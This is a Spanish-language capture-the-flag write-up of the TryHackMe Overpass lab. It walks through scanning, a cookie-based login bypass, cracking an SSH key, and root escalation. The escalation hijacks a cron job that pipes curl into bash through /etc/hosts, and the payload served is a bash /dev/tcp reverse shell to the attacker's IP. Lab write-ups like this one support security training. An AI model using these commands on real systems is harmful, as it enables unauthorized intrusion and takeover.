---
layout: single
title: OverPass - TryHackMe
excerpt: " TryHackMe's Overpass room is an easy-level room involving a cookie authentication bypass, John the Ripper, crontabs, and hosts editing to go from an nmap scan to root access on a target machine. "
date: 2022-09-12
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-overpass/overpass.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - john
  - crontab
  - ssh
  - python
---

TryHackMe's Overpass room is an easy-level room involving a cookie authentication bypass, John the Ripper, crontabs, and hosts editing to go from an nmap scan to root access on a target machine.

# Summary
- IP: 10.10.113.192
- Ports: 22,80
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Golang net/http server

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` bash
$sudo nmap -p22,80,139,445,8009,8080 -sCV 10.10.116.216 -oN targeted
```

- Escaneo de directorio de página web:

```bash
$sudo gobuster dir -u 10.10.249.223 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

- Entramos al directorio "/admin" y nos encontramos con un login, analizamos el código fuente y vemos que hay código javascript, analizamos el archivo "login.js" en búsqueda de vulnerabilidades, y vemos el siguiente fragmento:

```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

- Por lo que vemos, se está validando el logeo con una simple condicional la cual toma como referencia y modifica la Cookie de sesión, siendo que al indicar una cuenta válida, la cookie se llamará "SessionToke"; sabiendo esto, podemos explotar esto creando una cookie en firefox con el nombre de "SessionToken" y recargando la página, ya estaríamos dentro como admin.


- Dentro de la página de amin vemos un usuario y una private key SSH, la cual intentaremos romper con John:

```bash
$python ssh2john.py rsa_james > hash_james.hash 
```

- Obtenemos la contraseña, accedemos via ssh:

```bash
$ssh -i rsa_james.txt james@10.10.249.223
```

- Obtenemos la primera flag y vemos un archivo todo.txt, lo analizamos y encontramos lo siguiente:

 Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

- Mencionan una script, buscamos en las tareas automatizadas (crontab) para analizar en qué consiste dicha script:

```bash
cat /etc/crontab
```

- Vemos la tarea: ```root curl overpass.thm/downloads/src/buildscript.sh | bash``` lo cual nos indica que cada cierto tiempo como ROOT está actualizando el código en bash de la script descargando desde la página overpass; comprobamos que tenemos acceso de escritura del archivo /etc/hosts y lo modificamos para que en lugar de accede a la página "overpass.thm" nos redireccione a nuestra máquina atacante:

```
10.18.101.123 localhost
10.18.101.123 overpass-prod
10.18.101.123 overpass.thm
```

- Ahora en nuestra máquina, nos creamos el directorio y archivo /downloads/src/buildscript.sh y le insertamos una reverse shell:

```sh
mkdir /downloads/src/
nano buildscript.sh
```

```bash
bash -i >& /dev/tcp/10.18.101.123/443 0>&1
```

- Nos montamos un servidor http en el puerto 80 en el directorio base de la máquina atacante:

```bash
$sudo python3 -m http.server 80
```

- Nos ponemos en escucha en el puerto 443, esperamos a que la tarea ejecute el comando inyectado y accedemos a la máquina como ROOT.
